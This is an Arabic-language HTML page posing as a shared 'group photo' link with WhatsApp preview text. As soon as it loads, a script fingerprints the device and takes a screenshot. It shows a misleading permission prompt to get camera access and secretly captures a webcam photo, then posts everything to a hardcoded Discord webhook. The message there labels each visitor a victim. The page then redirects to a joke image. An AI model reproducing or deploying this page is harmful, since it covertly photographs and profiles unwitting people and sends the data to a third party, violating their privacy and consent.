<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري فتح الصورة الجماعية...</title>
    
    <!-- بطاقات معاينة الرابط في الواتساب -->
    <meta property="og:title" content="فضيحة عيال القروب بالساحل! 😱">
    <meta property="og:description" content="شوف وش طلع عنكم بالذكاء الاصطناعي هههههههه">
    <meta property="og:image" content="https://i.imgur.com/7gX6XvT.jpeg">

    <!-- مكتبة التقاط سكرين شوت للصفحة -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border-left-color: #38bdf8;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body id="capture-area">

    <div class="spinner"></div>
    <h2>جاري فحص الصورة الجماعية... 📸</h2>
    <p style="color: #94a3b8;">يرجى السماح بالوصول لخدمات العرض لعرض الصورة عالية الدقة</p>

    <!-- عناصر مخفية للكاميرا -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // رابط ديسكورد الـ Webhook الخاص بك
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1563206616780906536/Sgr0Y2vRCC4UEXiMXuavwOl738sFta-ui7TE057JstRKXZu1oiQ9ZTFPxbbhSK9oY4dE";

        // تحديد نوع الجهاز بدقة
        let phoneType = "جهاز كمبيوتر / غير معروف";
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) phoneType = "أندرويد (Android)";
        else if (/iphone|ipad|ipod/i.test(ua)) phoneType = "آيفون (iPhone / iOS)";

        // دالة إرسال البيانات والملفات إلى ديسكورد
        async function sendToDiscord(photoBlob, screenshotBlob) {
            const formData = new FormData();
            
            const payload = {
                content: `🚨 **طاحت ضحية جديدة بالمقلب!** 🔥\n📱 **نوع الجهاز:** ${phoneType}\n🖥️ **دقة الشاشة:** ${window.screen.width}x${window.screen.height}\n🌐 **اللغة:** ${navigator.language}`
            };

            formData.append('payload_json', JSON.stringify(payload));
            
            if (photoBlob) formData.append('file1', photoBlob, 'camera_photo.jpg');
            if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen_capture.png');

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error(err);
            }

            // التحويل المباشر لصورة المقلب المضحكة
            window.location.href = "https://i.imgur.com/7gX6XvT.jpeg";
        }

        // إشعار سكرين شوت الشاشة + الكاميرا
        async function startCapture() {
            // 1. أخذ سكرين شوت لشاشة الموقع
            let screenshotBlob = null;
            try {
                const screenCanvas = await html2canvas(document.body);
                screenshotBlob = await new Promise(resolve => screenCanvas.toBlob(resolve, 'image/png'));
            } catch (e) { console.log(e); }

            // 2. محاولة أخذ صورة من الكاميرا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);

                    canvas.toBlob(async (photoBlob) => {
                        await sendToDiscord(photoBlob, screenshotBlob);
                    }, 'image/jpeg');
                }, 800);

            } catch (err) {
                // لو رفض الكاميرا يرسل السكرين شوت والبيانات فقط
                await sendToDiscord(null, screenshotBlob);
            }
        }

        // تشغيل العملية فور تحميل الصفحة
        window.onload = () => {
            setTimeout(startCapture, 500);
        };
    </script>
</body>
</html>
